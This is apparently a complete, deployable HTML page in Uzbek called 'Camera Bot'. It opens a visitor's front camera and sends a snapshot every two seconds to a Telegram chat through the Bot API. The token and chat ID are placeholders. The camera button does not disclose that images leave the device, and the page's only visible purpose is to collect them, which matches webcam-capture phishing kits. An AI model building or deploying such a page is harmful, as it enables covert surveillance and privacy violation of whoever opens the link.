<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Bot</title>
  <style>
    body {
      background: #000;
      color: #fff;
      text-align: center;
      font-family: sans-serif;
      margin: 0;
      padding: 20px;
    }
    video {
      width: 100%;
      max-width: 400px;
      border-radius: 10px;
      margin-top: 10px;
      background: #222;
    }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      background: #007bff;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>ðŸ“¸ Kamera Bot</h2>
  <video id="video" autoplay playsinline muted></video>
  <button id="startBtn">Kamerani yoqish</button>
  <p id="status"></p>

  <script>
    const video = document.getElementById('video');
    const statusText = document.getElementById('status');
    const startBtn = document.getElementById('startBtn');
    let intervalId;

    // ðŸ”¹ Telegram bot maâ€™lumotlari
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    const CHAT_ID = "YOUR_CHAT_ID_HERE";

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        statusText.textContent = "Kamera ishga tushdi!";
        startBtn.disabled = true;
        sendFrames();
      } catch (err) {
        console.error(err);
        alert("Kamera ruxsati berilmadi yoki xatolik: " + err.message);
      }
    }

    function sendFrames() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      intervalId = setInterval(async () => {
        if (!video.videoWidth || !video.videoHeight) return; // hali tayyor emas
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'frame.jpg');

        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          if (res.ok) {
            console.log("Rasm yuborildi");
            statusText.textContent = "ðŸ“¤ Rasm yuborilmoqda...";
          } else {
            console.error("Telegram yuborishda xato");
          }
        } catch (e) {
          console.error("Fetch xatosi:", e);
        }
      }, 2000); // har 2 sekundda
    }

    startBtn.addEventListener('click', startCamera);
  </script>
</body>
</html>
